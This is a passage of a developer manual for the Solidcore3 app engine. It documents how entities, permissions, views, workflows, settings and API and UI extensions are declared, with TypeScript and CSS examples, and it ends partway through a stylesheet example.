# Complete App Directory Manual
## The Definitive Guide to What Can Be Defined in Solidcore3

> **For AI & Developers**: This manual documents everything possible in the `/app` directory of a Solidcore3 application.

---

## 🚀 The Engine Architecture

> **FUNDAMENTAL INSIGHT**: Solidcore3 is not a framework—it's a **runtime engine** that interprets your application definition and generates everything dynamically.

### What Does "Engine" Mean?

Unlike traditional frameworks where you write code that calls framework functions, Solidcore3 works like a game engine or database engine:

1. **You provide declarations** (the truth file)
2. **The engine interprets** these declarations
3. **Everything is generated** at runtime
4. **No build step required**

```
Traditional Framework:          Solidcore3 Engine:
┌─────────────────┐            ┌─────────────────┐
│ Your Code       │            │ Truth File      │
│ ↓               │            │ (Declarations)  │
│ Framework APIs  │            └────────┬────────┘
│ ↓               │                     ↓
│ Built App       │            ┌─────────────────┐
└─────────────────┘            │ Runtime Engine  │
                               │ • Interprets    │
                               │ • Generates     │
                               │ • Executes      │
                               └────────┬────────┘
                                        ↓
                               ┌─────────────────┐
                               │ Running App     │
                               │ • Database      │
                               │ • API           │
                               │ • UI            │
                               │ • Workflows     │
                               └─────────────────┘
```

### 🎯 Advantages of the Engine Approach

#### 1. **Zero Code Generation**
- No generated files to manage
- No "scaffolding" that gets out of sync
- Changes apply instantly without rebuild

#### 2. **Perfect Consistency**
- All CRUD operations work identically
- Permissions enforced uniformly
- UI patterns consistent across entities

#### 3. **Runtime Optimization**
- Engine can optimize based on actual usage
- Smart caching of hot paths
- Dynamic index generation

#### 4. **Progressive Disclosure**
- Start with simple declarations
- Engine handles all complexity
- Add advanced features only when needed

#### 5. **AI-Perfect Interface**
- Single file to understand
- Declarative not imperative
- No boilerplate to generate

#### 6. **Live Evolution**
- Change schema → instant migration
- Add field → UI updates automatically
- Modify workflow → applies immediately

### 🛡️ How We Tackle Engine Disadvantages

#### Challenge 1: **Performance Overhead**
**Solution**: Multi-layer architecture
- **Development**: Full interpretation for instant feedback
- **Production**: Pre-compiled representations
- **Edge**: Optimized bundles with tree-shaking

#### Challenge 2: **Debugging Complexity**
**Solution**: Transparent generation
- **Source maps**: Link runtime errors to truth file
- **Generation viewer**: See exactly what's created
- **Step-through debugging**: Debug generated code

#### Challenge 3: **Limited Flexibility**
**Solution**: Extension system
- **Escape hatches**: For custom logic
- **Plugin architecture**: For cross-cutting concerns
- **Direct SQL**: When needed for complex queries

#### Challenge 4: **Learning Curve**
**Solution**: Progressive complexity
- **Start simple**: Basic CRUD needs no extensions
- **Gradual enhancement**: Add features as needed
- **Rich documentation**: This manual!

### 🔮 Future Roadmap: Engine Possibilities

Because Solidcore3 is an engine, we can add revolutionary features impossible with traditional frameworks:

#### **Phase 1: Intelligent Generation** (Next 6 months)
- **Smart Optimization**: Engine learns from usage patterns
- **Automatic Indexes**: Generate based on query analysis
- **Predictive Caching**: Pre-cache based on access patterns
- **Query Optimization**: Rewrite queries for performance

#### **Phase 2: Multi-Target Generation** (6-12 months)
- **Mobile Apps**: Generate React Native from truth file
- **Desktop Apps**: Generate Electron apps
- **CLI Tools**: Generate command-line interfaces
- **API Clients**: Generate SDKs in any language

#### **Phase 3: AI Integration** (12-18 months)
- **Natural Language**: Define apps in plain English
- **Smart Suggestions**: AI recommends schema improvements
- **Auto-Documentation**: Generate docs from usage
- **Performance AI**: Automatic performance optimization

#### **Phase 4: Distributed Engine** (18-24 months)
- **Multi-Region**: Deploy globally with one truth file
- **Auto-Scaling**: Engine manages infrastructure
- **Edge Computing**: Push logic to edge automatically
- **Federation**: Connect multiple Solidcore3 apps

#### **Phase 5: Visual Programming** (24+ months)
- **Visual Truth Editor**: Drag-drop entity design
- **Live Collaboration**: Multiple developers, one truth
- **Version Control**: Built-in branching/merging
- **Deploy Previews**: Test changes before applying

### 🎮 Engine-Exclusive Features (Impossible with Traditional Frameworks)

#### **Time Travel Debugging**
```typescript
// Because engine controls execution, we can:
engine.debug.goToTime('2024-01-15T10:30:00');
engine.debug.replayRequests();
engine.debug.showStateAt(timestamp);
```

#### **Automatic API Versioning**
```typescript
// Engine generates versioned APIs automatically
GET /api/v1/tasks  // Original schema
GET /api/v2/tasks  // After schema evolution
// Both work simultaneously!
```

#### **Smart Migrations**
```typescript
// Engine understands intent, not just structure
renameField: {
  from: 'task_name',
  to: 'title',
  preserveData: true,
  updateReferences: true  // Updates views, workflows!
}
```

#### **Cross-Entity Optimization**
```typescript
// Engine optimizes across your entire app
views: {
  Dashboard: {
    shows: ['User.tasks', 'Task.comments', 'Comment.author']
    // Engine generates ONE optimized query!
  }
}
```

#### **Adaptive UI**
```typescript
// Engine adjusts UI based on usage
entities: {
  Task: {
    fields: { title, description, priority, status, ... }
    // Engine learns which fields are used most
    // Automatically optimizes forms and lists!
  }
}
```

### 🏗️ The Engine Advantage Summary

| Traditional Framework | Solidcore3 Engine |
|----------------------|-------------------|
| You call framework APIs | Engine interprets declarations |
| Build step required | No build, instant execution |
| Generated code to maintain | Everything generated at runtime |
| Fixed patterns | Adaptive optimization |
| Static deployment | Dynamic evolution |
| Learn framework APIs | Declare what you want |

**The engine approach means**: Write less, get more, evolve continuously.

---

## 📁 Directory Structure

```
app/
├── app.truth.ts          # 🎯 SINGLE SOURCE OF TRUTH (Required)
├── extensions/            # 🔧 Optional custom logic
│   ├── [entity]-api.ts    # API extensions 
│   ├── [entity]-ui.ts     # UI extensions
│   └── [feature].ts       # Workflow extensions
├── ui/                    # 🎨 Optional custom UI components
│   └── [Component].tsx    # Custom Preact components
└── static/                # 📁 Static assets
    ├── images/
    ├── styles/
    └── scripts/
```

---

## 🎯 1. THE TRUTH FILE (`app.truth.ts`)

**The heart of your application.** One file defines everything.

### Required Structure
```typescript
import { AppDefinition } from '../core/types/index.ts';

export const App: AppDefinition = {
  name: string,           // App name (required)
  version?: string,       // Version number
  description?: string,   // App description
  
  entities: { ... },      // Data model (required)
  views?: { ... },        // UI pages (optional)
  workflows?: { ... },    // Automation (optional)
  settings?: { ... }      // Configuration (optional)
}
```

---

## 📊 2. ENTITIES - Your Data Model

> **🚨 IMPORTANT CLARIFICATION**: Current relationship limitations are documented at the end of this section.

Define what data your app stores and how it behaves.

### Basic Entity Structure
```typescript
entities: {
  EntityName: {
    fields: { ... },        // Database columns (required)
    behaviors?: { ... },    // One-click actions (optional)
    permissions?: { ... },  // Access control (optional)
    indexes?: string[][],   // Database indexes (optional)
    computed?: { ... },     // Calculated fields (optional)
    ui?: { ... }           // UI configuration (optional)
  }
}
```

### 🏗️ Fields - Database Columns

Every field defines a column in your database table.

#### Field Types
```typescript
// Supported types
type: 'string' | 'text' | 'number' | 'integer' | 'boolean' | 
      'date' | 'datetime' | 'json' | 'uuid' | 'enum' | 'relation'
```

#### Universal Field Properties
```typescript
{
  type: FieldType,        // Field type (required)
  required?: boolean,     // Must be provided
  unique?: boolean,       // Must be unique across records
  default?: any,         // Default value ('auto', 'now', or literal)
  description?: string,   // Field description
  auto?: boolean,        // Auto-generated by framework
  label?: string         // Display label for UI
}
```

#### String Fields
```typescript
{
  type: 'string',
  minLength?: number,     // Minimum characters
  maxLength?: number,     // Maximum characters
  pattern?: string       // Regex validation
}

// Examples:
title: { type: 'string', required: true, maxLength: 200 }
slug: { type: 'string', unique: true, pattern: '^[a-z0-9-]+$' }
```

#### Text Fields (Long Content)
```typescript
{
  type: 'text'           // For long content (articles, descriptions)
}

// Examples:
description: { type: 'text' }
content: { type: 'text', required: true }
```

#### Number Fields
```typescript
{
  type: 'number' | 'integer',
  min?: number,          // Minimum value
  max?: number,          // Maximum value
  integer?: boolean      // Force integer (for 'number' type)
}

// Examples:
price: { type: 'number', min: 0 }
quantity: { type: 'integer', min: 1, max: 100 }
```

#### Boolean Fields
```typescript
{
  type: 'boolean',
  default?: boolean      // true or false
}

// Examples:
published: { type: 'boolean', default: false }
isActive: { type: 'boolean', default: true }
```

#### Date/DateTime Fields
```typescript
{
  type: 'date' | 'datetime',
  format?: string        // Display format hint
}

// Examples:
dueDate: { type: 'date' }
publishedAt: { type: 'datetime', default: 'now' }
createdAt: { type: 'datetime', auto: true }
```

#### Enum Fields (Dropdowns)
```typescript
{
  type: 'enum',
  values: string[],      // Available options (required)
  default?: string       // Must be one of the values
}

// Examples:
status: { 
  type: 'enum', 
  values: ['draft', 'published', 'archived'], 
  default: 'draft' 
}
priority: { 
  type: 'enum', 
  values: ['low', 'medium', 'high'], 
  default: 'medium' 
}
```

#### Relation Fields (Foreign Keys)
```typescript
{
  type: 'relation',
  to: string,           // Target entity name (required)
  many?: boolean        // One-to-many relationship
}

// Examples:
userId: { type: 'relation', to: 'User' }
categoryId: { type: 'relation', to: 'Category' }
tags: { type: 'relation', to: 'Tag', many: true }
```

> **🚨 RELATIONSHIP LIMITATIONS**: Solidcore3 currently has **forward-only relationships**. Understanding these limitations is critical for production applications.

#### What Works (Forward Relationships)
- **Storage**: Foreign key values stored as text IDs
- **API Access**: Standard CRUD endpoints return related IDs
- **Manual Queries**: Separate API calls required for related data

```typescript
// ✅ This works - forward relationship
Post: {
  fields: {
    title: { type: 'string' },
    authorId: { type: 'relation', to: 'User' }  // Stores User.id
  }
}

// API Usage:
const post = await fetch('/api/posts/123').then(r => r.json());
// Returns: { id: '123', title: 'My Post', authorId: 'user456' }

const author = await fetch(`/api/users/${post.authorId}`).then(r => r.json());
// Manual second call required for author data
```

#### What Doesn't Work (Reverse Relationships)
- **❌ No automatic reverse fields**: User doesn't get a `posts` field
- **❌ No population**: Can't get `POST /api/posts?populate=author`
- **❌ No reverse endpoints**: No `GET /api/users/123/posts`
- **❌ No JOIN queries**: No efficient related data fetching

```typescript
// ❌ This is NOT automatically created:
User: {
  fields: {
    name: { type: 'string' },
    posts: { type: 'relation', to: 'Post', many: true, reverse: 'authorId' }  // Not supported
  }
}

// ❌ These API patterns don't work:
// GET /api/posts?populate=author
// GET /api/users/123/posts
// GET /api/posts with embedded author data
```

#### Current Workarounds
```typescript
// Manual relationship queries through extensions
// See Section 6 for extension examples
```

#### JSON Fields (Complex Data)
```typescript
{
  type: 'json'          // Stores any JSON object
}

// Examples:
metadata: { type: 'json' }
settings: { type: 'json', default: {} }
```

#### UUID Fields (Unique IDs)
```typescript
{
  type: 'uuid',
  auto?: boolean        // Auto-generate UUID
}

// Examples:
id: { type: 'uuid', auto: true, unique: true }
externalId: { type: 'uuid' }
```

### ⚡ Behaviors - One-Click Actions

Define actions users can perform on entities.

```typescript
behaviors: {
  behaviorName: {
    type?: string,                    // 'update' (default)
    modifies?: Record<string, any>,   // Fields to change
    emits?: string | string[],        // Events to emit
    requires?: string                 // Permission required
  }
}
```

#### Examples
```typescript
behaviors: {
  publish: {
    modifies: { status: 'published', publishedAt: 'now' },
    emits: 'post.published',
    requires: 'canPublish'
  },
  archive: {
    modifies: { status: 'archived' },
    emits: ['post.archived', 'stats.updated']
  },
  approve: {
    modifies: { approved: true, approvedBy: 'currentUser' },
    emits: 'approval.granted'
  }
}
```

**What this generates:**
- POST `/api/entityname/:id/behaviorname` endpoint
- Button in UI interfaces  
- Event emission for workflows
- Automatic database updates

### 🔒 Permissions - Access Control

Control who can do what with your entities.

```typescript
permissions: {
  create?: string,        // Who can create
  read?: string,          // Who can view
  update?: string,        // Who can edit
  delete?: string         // Who can delete
}
```

#### Permission Expression Language
```typescript
// Simple permissions
'public'              // Anyone
'authenticated'       // Logged-in users
'admin'              // Admin role

// Expression-based permissions
'user.role === "admin"'
'user.id === entity.ownerId'
'authenticated && user.department === "sales"'
'user.role === "manager" || entity.public === true'

// Examples:
permissions: {
  create: 'authenticated',
  read: 'user.id === entity.ownerId || user.role === "admin"',
  update: 'user.id === entity.ownerId',
  delete: 'user.role === "admin"'
}
```

### 📇 Database Indexes
```typescript
indexes: [
  ['field1'],                    // Single column index
  ['field1', 'field2'],          // Composite index
  ['status', 'createdAt']        // For complex queries
]

// Examples:
indexes: [
  ['status'],                    // Fast status filtering
  ['userId', 'createdAt'],       // User's recent items
  ['published', 'category']      // Published items by category
]
```

### 🧮 Computed Fields
```typescript
computed: {
  fieldName: 'expression'        // Computed at runtime
}

// Examples:
computed: {
  fullName: 'firstName + " " + lastName',
  isOverdue: 'dueDate < Date.now() && status !== "completed"',
  ageInDays: '(Date.now() - createdAt) / (24 * 60 * 60 * 1000)'
}
```

### 🎨 UI Configuration

Control how entities appear in the interface.

#### Display Configuration
```typescript
ui: {
  display: {
    primary: string,              // Main field to show (required)
    secondary?: string,           // Subtitle field
    badge?: string,              // Status badge field
    color?: {                    // Color coding
      field: string,             // Field to base color on
      map: Record<string, string> // Value -> color mapping
    },
    avatar?: string,             // Image field
    metadata?: string[]          // Additional info fields
  }
}

// Example:
ui: {
  display: {
    primary: 'title',            // Show title prominently
    secondary: 'description',    // Show description below
    badge: 'status',            // Show status as badge
    color: {
      field: 'priority',
      map: {
        high: '#dc3545',        // Red for high priority
        medium: '#ffc107',      // Yellow for medium  
        low: '#28a745'          // Green for low
      }
    },
    metadata: ['createdAt', 'author']
  }
}
```

#### List Configuration (Tables)
```typescript
ui: {
  list: {
    columns: string[],           // Columns to show
    sortable?: boolean | string[], // Sortable columns
    filterable?: boolean | string[], // Filterable columns  
    searchable?: string[],       // Searchable fields
    pagination?: {
      pageSize: number,
      showSizeOptions: boolean
    },
    actions?: string[]           // Available actions
  }
}

// Example:
ui: {
  list: {
    columns: ['title', 'status', 'priority', 'dueDate'],
    sortable: ['title', 'createdAt', 'dueDate'],
    filterable: ['status', 'priority'],
    searchable: ['title', 'description'],
    actions: ['view', 'edit', 'delete']
  }
}
```

#### Form Configuration
```typescript
ui: {
  form: {
    fields: string[],            // Fields to include
    layout: 'single-column' | 'two-column' | 'sections',
    sections?: Array<{
      title: string,
      fields: string[],
      collapsible?: boolean
    }>,
    validation?: Record<string, any>,
    submitText?: string,
    cancelText?: string
  }
}

// Example:
ui: {
  form: {
    layout: 'sections',
    sections: [
      {
        title: 'Basic Information',
        fields: ['title', 'description']
      },
      {
        title: 'Settings',
        fields: ['status', 'priority', 'dueDate'],
        collapsible: true
      }
    ]
  }
}
```

#### Detail View Configuration
```typescript
ui: {
  detail: {
    sections?: Array<{
      title: string,
      fields: string[]
    }>,
    actions?: string[]           // Available actions
  }
}

// Example:
ui: {
  detail: {
    sections: [
      {
        title: 'Task Details',
        fields: ['title', 'description', 'status']
      },
      {
        title: 'Metadata',
        fields: ['createdAt', 'updatedAt', 'author']
      }
    ],
    actions: ['edit', 'delete', 'duplicate']
  }
}
```

---

## 📱 3. VIEWS - Your Web Pages

Define the actual pages users see in your application.

### View Types
```typescript
views: {
  ViewName: {
    type: 'list' | 'detail' | 'form',  // Page type (required)
    route: string,                      // URL path (required)
    entity?: string,                    // Associated entity
    title?: string,                     // Page title
    mode?: 'create' | 'edit',          // For form views
    filters?: Record<string, any>,     // Pre-applied filters
    actions?: string[]                 // Available actions
  }
}
```

#### List Views (Tables/Grids)
```typescript
TaskList: {
  type: 'list',
  route: '/tasks',
  entity: 'Task',
  title: 'All Tasks',
  filters: {
    status: ['todo', 'in-progress']    // Show only active tasks
  }
}

UserManagement: {
  type: 'list', 
  route: '/admin/users',
  entity: 'User',
  title: 'User Management',
  actions: ['view', 'edit', 'disable']
}
```

#### Detail Views (Single Item)
```typescript
TaskDetail: {
  type: 'detail',
  route: '/tasks/:id',               // :id is dynamic parameter
  entity: 'Task',
  actions: ['edit', 'delete', 'duplicate']
}

UserProfile: {
  type: 'detail',
  route: '/profile/:userId',
  entity: 'User',
  title: 'User Profile'
}
```

#### Form Views (Create/Edit)
```typescript
CreateTask: {
  type: 'form',
  route: '/tasks/new',
  entity: 'Task',
  mode: 'create',
  title: 'Create New Task'
}

EditUser: {
  type: 'form',
  route: '/users/:id/edit',
  entity: 'User', 
  mode: 'edit',
  title: 'Edit User'
}
```

**What this generates:**
- Complete HTML pages
- Client-side JavaScript for interactions
- Automatic CRUD operations
- Navigation between views
- Responsive design

---

## 🤖 4. WORKFLOWS - Automation

Define what happens automatically when events occur.

### Workflow Structure
```typescript
workflows: {
  workflowName: {
    trigger: string,              // When to run (required)
    condition?: string,           // Additional condition
    description?: string,         // What this workflow does
    actions: WorkflowAction[],    // What to do (required)
    async?: boolean              // Run asynchronously
  }
}
```

### Triggers
```typescript
// Entity lifecycle events
'EntityName.created'        // When entity is created
'EntityName.updated'        // When entity is updated  
'EntityName.deleted'        // When entity is deleted

// Behavior events
'EntityName.behaviorName'   // When behavior is executed

// Examples:
trigger: 'Task.created'          // New task created
trigger: 'Task.completed'        // Task completed behavior
trigger: 'User.registered'       // User registration
```

### Conditions
```typescript
// Only run workflow if condition is true
condition: 'priority === "high"'
condition: 'status === "published" && category === "urgent"'
condition: 'user.role === "admin"'
condition: 'dueDate < Date.now()'
```

### 📋 Workflow Context Variables

All workflow conditions and actions have access to these context variables:

| Variable | Type | Description | Example |
|----------|------|-------------|---------|
| `entity` | string | Entity name that triggered the event | `"Task"` |
| `entityId` | string | ID of the specific entity instance | `"task_123"` |
| `user` | string | User ID who triggered the action | `"user_456"` |
| `timestamp` | string | ISO timestamp when event occurred | `"2024-01-15T10:30:00Z"` |
| `behavior` | string | Behavior name (if triggered by behavior) | `"completed"` |
| **Entity Fields** | any | All entity fields available directly | |
| `title` | string | Entity's title field (example) | `"My Task"` |
| `status` | string | Entity's status field (example) | `"in_progress"` |
| `priority` | string | Entity's priority field (example) | `"high"` |
| `createdAt` | datetime | Entity's creation time | `"2024-01-15T09:00:00Z"` |

#### Usage in Conditions
```typescript
// Access entity fields directly
condition: 'priority === "high"'
condition: 'status === "published" && user === "admin_123"'
condition: 'timestamp > "2024-01-01T00:00:00Z"'
```

#### Usage in Action Templates
> **🚨 IMPORTANT**: Template interpolation (`${variable}`) is **not currently implemented**. Variables are accessible in extension code but not in string templates.

```typescript
// ❌ This syntax doesn't work yet:
message: 'Task ${title} was completed by ${user}'

// ✅ Variables are available in extension code:
// See Section 6 for extension examples where you can access:
// event.data.title, event.entityId, event.user, etc.
```

### Actions

#### Built-in Action Types
```typescript
// Email actions
{
  type: 'email',
  to: string,                    // Recipient email
  subject?: string,              // Email subject
  message: string,               // Email body
  template?: string              // Template name
}

// Webhook actions  
{
  type: 'webhook',
  url: string,                   // Webhook URL
  method?: 'POST' | 'PUT',       // HTTP method
  headers?: Record<string, string>, // Custom headers
  data?: Record<string, any>     // Custom payload
}

// Log actions
{
  type: 'log',
  level?: 'info' | 'warn' | 'error', // Log level
  message: string,               // Log message
  data?: any                     // Additional data
}

// Custom actions (via extensions)
{
  type: 'slack',                 // Defined in extension
  channel: string,
  message: string
}
```

### Complete Workflow Examples
```typescript
workflows: {
  // Notify team of high-priority tasks
  highPriorityAlert: {
    trigger: 'Task.created',
    condition: 'priority === "high"',
    description: 'Alert team when high-priority tasks are created',
    actions: [
      {
        type: 'email',
        to: 'team@company.com',
        subject: '🚨 High Priority Task Created',
        message: 'A high priority task needs attention: ${data.title}'
      },
      {
        type: 'webhook', 
        url: 'https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX',
        data: {
          text: 'High priority task: ${data.title}',
          channel: '#urgent'
        }
      }
    ]
  },

  // Welcome new users
  userWelcome: {
    trigger: 'User.created',
    description: 'Welcome new users with email and setup',
    actions: [
      {
        type: 'email',
        to: '${data.email}',
        template: 'welcome',
        subject: 'Welcome to ${app.name}!'
      },
      {
        type: 'log',
        message: 'New user welcomed: ${data.email}'
      }
    ]
  },

  // Project completion celebration
  projectCelebration: {
    trigger: 'Project.completed',
    description: 'Celebrate project completion',
    async: true,
    actions: [
      {
        type: 'email',
        to: '${data.team}',
        subject: '🎉 Project Complete: ${data.name}',
        template: 'completion'
      },
      {
        type: 'webhook',
        url: 'https://api.company.com/stats/project-completed',
        data: {
          projectId: '${data.id}',
          completedAt: '${timestamp}',
          duration: '${data.duration}'
        }
      }
    ]
  }
}
```

**What this generates:**
- Event listeners on database changes
- Automatic action execution
- Error handling and retries
- Logging and monitoring
- Async processing for performance

---

## ⚙️ 5. SETTINGS - App Configuration

Configure authentication, database, and UI settings.

```typescript
settings: {
  auth?: {
    enabled: boolean,            // Enable authentication
    provider?: string,           // Auth provider ('local', 'oauth', etc.)
    sessionTimeout?: number      // Session timeout in minutes
  },
  
  database?: {
    url?: string,               // Database connection URL
    migrations?: boolean        // Auto-run migrations
  },
  
  ui?: {
    theme?: string,             // Default theme ('light', 'dark')
    layout?: string            // Default layout
  }
}
```

### Examples
```typescript
settings: {
  auth: {
    enabled: true,
    provider: 'local',
    sessionTimeout: 1440        // 24 hours
  },
  
  database: {
    url: process.env.DATABASE_URL,
    migrations: true
  },
  
  ui: {
    theme: 'light',
    layout: 'sidebar'
  }
}
```

---

## 🔧 6. EXTENSIONS - The Complete Escape Hatch System

**Extensions are the primary way to add custom logic beyond the truth file.** They provide extensive override and customization capabilities while maintaining the declarative core.

### 🎯 Extension Philosophy 

Extensions follow the principle of **"Progressive Disclosure of Complexity"**:
1. **Start Simple**: Truth file handles 80% of use cases
2. **Add Complexity**: Extensions handle the remaining 20%
3. **Maintain Boundaries**: Extensions can't break core functionality
4. **Type Safety**: Full TypeScript support throughout

### 📂 Extension Directory Structure

```
app/extensions/
├── [entity-name]-api.ts       # API enhancements for specific entities
├── [entity-name]-ui.ts        # UI customizations for specific entities  
├── [feature-name].ts          # Workflow/business logic extensions
└── [integration-name].ts      # Third-party integrations
```

### 🌐 API Extensions (`APIExtension`)

API Extensions provide comprehensive backend customization capabilities.

#### **Complete API Extension Example**
```typescript
// app/extensions/task-analytics.ts
import { APIExtension } from '../../core/types/extensions.ts';

const extension: APIExtension = {
  name: 'task-analytics',
  type: 'api',
  version: '1.0.0',
  description: 'Advanced analytics and reporting for tasks',
  author: 'Your Team',
  
  // Optional: bind to specific entity (adds routes under /api/task/*)
  entity: 'Task',
  
  // Custom API Routes
  routes: [
    {
      method: 'GET',
      path: '/stats',                    // Creates: /api/task/stats
      description: 'Get task statistics',
      handler: async (c) => {
        const db = c.get('db');
        const stats = await db.execute(`
          SELECT 
            COUNT(*) as total,
            COUNT(CASE WHEN status = 'done' THEN 1 END) as completed,
            COUNT(CASE WHEN priority = 'high' THEN 1 END) as highPriority
          FROM task
        `);
        
        return c.json({
          summary: stats.rows[0],
          generatedAt: new Date().toISOString()
        });
      }
    },
    {
      method: 'POST',
      path: '/bulk-update',              // Creates: /api/task/bulk-update
      handler: async (c) => {
        const { ids, updates } = await c.req.json();
        // Custom bulk update logic
        return c.json({ updated: ids.length });
      }
    },
    {
      method: 'GET', 
      path: '/export',                   // Creates: /api/task/export
      handler: async (c) => {
        // Generate CSV/Excel export
        const format = c.req.query('format') || 'csv';
        // ... export logic
        return c.body(exportData, 200, {
          'Content-Type': 'application/octet-stream',
          'Content-Disposition': `attachment; filename="tasks.${format}"`
        });
      }
    }
  ],
  
  // Custom Middleware
  middleware: [
    {
      name: 'analytics-logger',
      handler: async (c, next) => {
        const start = Date.now();
        await next();
        const duration = Date.now() - start;
        console.log(`📊 Analytics API: ${c.req.method} ${c.req.path} - ${duration}ms`);
      },
      routes: ['/stats', '/export']      // Apply only to specific routes
    },
    {
      name: 'rate-limiter',
      handler: async (c, next) => {
        // Custom rate limiting logic
        const userIP = c.req.header('x-forwarded-for') || 'unknown';
        if (await isRateLimited(userIP)) {
          return c.json({ error: 'Rate limited' }, 429);
        }
        await next();
      }
    }
  ],
  
  // Lifecycle Hooks (Comprehensive Override System)
  hooks: {
    // Before entity creation
    beforeCreate: async (data, context) => {
      console.log(`📝 Creating task: ${data.title}`);
      
      // Custom validation
      if (data.priority === 'high' && !data.assigneeId) {
        throw new Error('High priority tasks must be assigned');
      }
      
      // Data transformation
      data.slug = data.title.toLowerCase().replace(/\s+/g, '-');
      data.analytics = { createdVia: 'api', timestamp: Date.now() };
      
      return data; // Return modified data
    },
    
    // After entity creation
    afterCreate: async (data, result, context) => {
      console.log(`✅ Task created: ${data.title} (ID: ${result.id})`);
      
      // Custom side effects
      await sendNotification('task.created', data);
      await updateAnalytics('task_created', data);
      
      // Auto-assign if criteria met
      if (data.priority === 'high' && !data.assigneeId) {
        await autoAssignTask(result.id);
      }
    },
    
    // Before entity update
    beforeUpdate: async (id, data, context) => {
      console.log(`📝 Updating task: ${id}`);
      
      // Fetch current state for comparison
      const current = await context.db.execute(
        'SELECT * FROM task WHERE id = ?', [id]
      );
      
      // Custom business logic
      if (current.status !== 'done' && data.status === 'done') {
        data.completedAt = new Date().toISOString();
        data.completedBy = context.user?.id;
      }
      
      return data;
    },
    
    // After entity update  
    afterUpdate: async (id, data, result, context) => {
      console.log(`✅ Task updated: ${id}`);
      
      // Trigger workflows based on changes
      if (data.status === 'done') {
        await context.events.emit('task.completed', { 
          taskId: id, 
          task: result,
          completedBy: context.user 
        });
      }
      
      // Update search index
      await updateSearchIndex('task', id, result);
    },
    
    // Before entity deletion
    beforeDelete: async (id, context) => {
      console.log(`🗑️ Deleting task: ${id}`);
      
      // Check dependencies
      const dependencies = await checkTaskDependencies(id);
      if (dependencies.length > 0) {
        throw new Error(`Cannot delete task with ${dependencies.length} dependencies`);
      }
    },
    
    // After entity deletion
    afterDelete: async (id, context) => {
      console.log(`✅ Task deleted: ${id}`);
      
      // Cleanup related data
      await cleanupTaskAnalytics(id);
      await removeFromSearchIndex('task', id);
    },
    
    // Before entity read (list/get)
    beforeRead: async (id, context) => {
      // Add custom filters or permissions
      const user = context.user;
      if (user?.role !== 'admin') {
        // Non-admins can only see their own tasks
        context.addFilter('assigneeId', user.id);
      }
    },
    
    // After entity read
    afterRead: async (data, context) => {
      // Transform response data
      if (Array.isArray(data)) {
        // Add computed fields to each item
        return data.map(item => ({
          ...item,
          isOverdue: item.dueDate && new Date(item.dueDate) < new Date(),
          timeRemaining: calculateTimeRemaining(item.dueDate)
        }));
      } else {
        // Single item
        return {
          ...data,
          isOverdue: data.dueDate && new Date(data.dueDate) < new Date(),
          timeRemaining: calculateTimeRemaining(data.dueDate),
          analytics: await getTaskAnalytics(data.id)
        };
      }
    }
  }
};

export default extension;

// Optional initialization function
export async function init(context: ExtensionContext) {
  console.log('🔧 Task Analytics extension initialized');
  
  // Register custom event listeners
  context.events.on('task.created', async (event) => {
    await updateDashboardStats();
  });
  
  // Setup custom database tables for analytics
  await context.db.execute(`
    CREATE TABLE IF NOT EXISTS task_analytics (
      task_id TEXT PRIMARY KEY,
      view_count INTEGER DEFAULT 0,
      edit_count INTEGER DEFAULT 0,
      last_viewed_at DATETIME,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
}
```

#### **API Extension Capabilities**

**Route Override System:**
- **Complete Replacement**: Override default CRUD endpoints
- **Route Addition**: Add custom endpoints alongside defaults  
- **Method Support**: GET, POST, PUT, DELETE, PATCH
- **Path Mounting**: Automatic mounting under entity paths

**Middleware System:**
- **Global Middleware**: Apply to all routes with `app.use('*', middleware)`
- **Targeted Middleware**: Apply to specific route patterns
- **Execution Order**: Control middleware execution order
- **Context Access**: Full access to Hono context object

**Hook System (Complete Lifecycle Override):**
- **beforeCreate/afterCreate**: Control entity creation
- **beforeUpdate/afterUpdate**: Control entity updates
- **beforeDelete/afterDelete**: Control entity deletion
- **beforeRead/afterRead**: Control data retrieval and transformation

### 🎨 UI Extensions (`UIExtension`)

UI Extensions provide comprehensive frontend customization.

#### **Complete UI Extension Example**
```typescript
// app/extensions/task-themes.ts
import { UIExtension } from '../../core/types/extensions.ts';

const extension: UIExtension = {
  name: 'task-themes',
  type: 'ui',
  version: '1.0.0',
  description: 'Advanced theming and UI enhancements for tasks',
  author: 'Design Team',
  
  // Optional: target specific entity
  target: 'Task',
  
  // Global CSS Injection
  styles: `
    /* CSS Custom Properties for theming */
    :root {
      --task-high-priority: #dc3545;
      --task-medium-priority: #ffc107;
      --task-low-priority: #28a745;
      --task-border-radius: 8px;
      --task-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    /* Dark theme support */
    [data-theme="dark"] {
      --task-bg: #2d2d2d;
      --task-text: #e0e0e0;
      --task-border: #404040;
    }
    
    /* Enhanced task cards */
    .task-card {
      border-radius: var(--task-border-radius);
      box-shadow: var(--task-shadow);
      transition: transform 0.2s ease, box-shadow 0.2s ease;
      position: relative;
      overflow: hidden;
    }
    
    .task-card:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    }
    
    /* Priority indicators */
    .task-card::before {
      content: '';
      position: absolute;
      left: 0;
      top: 0;
      bottom: 0;
      width: 4px;
      background: var(--priority-color, #ccc);
    }
    
    .task-card[data-priority="high"]::before {
      background: var(--task-high-priority);
    }
    
    .task-card[data-priority="medium"]::before {
      background: var(--task-medium-priority);
    }
    
    .task-card[data-priority="low"]::before {
      background: var(--task-low-priority);
    }
    
    /* Status badges with enhanced styling */
    .status-badge {
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 0.75rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    
    .status-todo { 
      background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
      color: #6c757d;
      border: 1px solid #dee2e6;
    }
    
    .status-in-progress { 
      background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
      color: #856404;
      border: 1px solid #ffeaa7;
    }
    
    .status-done { 
      background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    
    /* Responsive enhancements */
    @media (max-width: 768px) {
      .task-card {
        margin-bottom: 1rem;
      }
      
      .task-grid {
        grid-template-columns: 1fr;
      }
    }
    
    /* Animation classes */
    @keyframes taskComplete {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
    
    .task-completed {
      animation: taskComplete 0.5s ease;
